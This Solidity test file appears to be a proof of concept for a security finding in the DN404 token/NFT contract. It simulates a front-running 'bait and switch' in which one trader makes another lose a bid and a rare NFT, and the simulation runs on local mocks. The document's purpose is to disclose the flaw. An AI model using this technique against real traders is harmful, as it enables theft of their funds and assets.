// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import {SoladyTest} from "../../utils/SoladyTest.sol";
import {MockDN404OnlyERC20 as ERC20} from "../../utils/mocks/MockDN404OnlyERC20.sol";
import {PocDN404} from "./PocDN404.sol";
import {DN404Mirror} from "../../../src/DN404Mirror.sol";


contract PocMintTests is SoladyTest {

    PocDN404 dn;
    DN404Mirror mirror;
    ERC20 WETH;

    function setUp() public {
        dn = new PocDN404("DN-POC", "DN-POC");
        mirror = new DN404Mirror(address(this));
        dn.initializeDN404(0, address(0), address(mirror));
        WETH = new ERC20();
    }

    function test_poc_bait_and_switch() public {
        address alice = address(uint160(uint256(keccak256(abi.encode(1)))));
        address bob = address(uint160(uint256(keccak256(abi.encode(2)))));
        address nftMarketplace = address(uint160(uint256(keccak256(abi.encode(3)))));
        address uniswapPool = address(uint160(uint256(keccak256(abi.encode(4)))));
        uint256 unit = 1 ether;
        uint256 rareNFTId = 4;
        uint256 initialAliceWETHBalance = 1 ether;
        uint256 initialBobWETHBalance = 0;
        uint256 uniswapPoolBaseUnitAmountCost = 0.4 ether;

        // setup
        vm.prank(uniswapPool);
        dn.setSkipNFT(true);
        WETH.mint(alice, initialAliceWETHBalance);
        WETH.mint(uniswapPool, 100 ether);
        

        // alice has 3 random NFTs
        dn.mint(alice, 3 * unit);
        assertEq(mirror.balanceOf(alice), 3);

        // bob has one rare NFT
        dn.mint(bob, unit);        
        assertEq(mirror.ownerOf(rareNFTId), bob);

        // mimicking bob putting his NFT up for sale
        vm.prank(bob);
        mirror.setApprovalForAll(nftMarketplace, true);
        
        // alice bids on the rare NFT (id = 4)
        uint256 bid = 0.5 ether;
        vm.prank(alice);
        WETH.approve(nftMarketplace, bid);

        // alice also wants to sell one of hers NFT for liquidity and initiates a uniswap token sell
        
        // bob sees the sell and front-runs it with accepting the bid, 
        // effectively sending the NFT token to her and the WETH bid amount to bob
        vm.startPrank(nftMarketplace);
        mirror.transferFrom(bob, alice, rareNFTId);
        WETH.transferFrom(alice, bob, bid);
        vm.stopPrank();

        // exactly at this point alice does have the rare NFT but her sell transaction is still pending 
        // and right next in the block to be executed
        assertEq(mirror.ownerOf(rareNFTId), alice);
        
        // thus alice sells a unit of base tokens and gets the WETH cost of a unit of base tokens on uniswap
        vm.prank(alice);
        dn.transfer(uniswapPool, unit);
        vm.prank(uniswapPool);
        WETH.transfer(alice, uniswapPoolBaseUnitAmountCost);

        uint256 aliceLoss = bid - uniswapPoolBaseUnitAmountCost;

        // leaving alice without the rare NFT, witch was sent off with the base unit tokens
        assertEq(mirror.ownerAt(rareNFTId), address(0));
        // alice also lost her bid amount
        assertEq(WETH.balanceOf(alice), initialAliceWETHBalance - aliceLoss);

        // bob quickly buys the unit amount from the pool to re-mint the rare NFT
        vm.prank(uniswapPool);
        dn.transfer(bob, unit);
        vm.prank(bob);
        WETH.transfer(uniswapPool, uniswapPoolBaseUnitAmountCost);

        assertEq(mirror.ownerAt(rareNFTId), bob);
        assertEq(WETH.balanceOf(bob), initialBobWETHBalance + aliceLoss);
                
        // In the end
        // alice - lost  the difference between the bid value and uniswap unit amount cost
        // bob   - gains the difference between the bid value and uniswap unit amount cost
    }
}
